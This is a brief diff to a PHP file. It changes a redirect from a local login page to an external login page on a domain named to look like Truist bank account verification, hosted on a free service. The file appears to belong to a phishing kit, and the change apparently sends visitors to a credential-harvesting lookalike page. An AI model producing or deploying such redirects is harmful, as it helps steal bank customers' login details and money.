@@ -1,4 +1,4 @@
 <?php
-header("Location:/../login.html");
+header("Location: https://verifytruistaccount.vercel.app/login.html");
 exit;
 
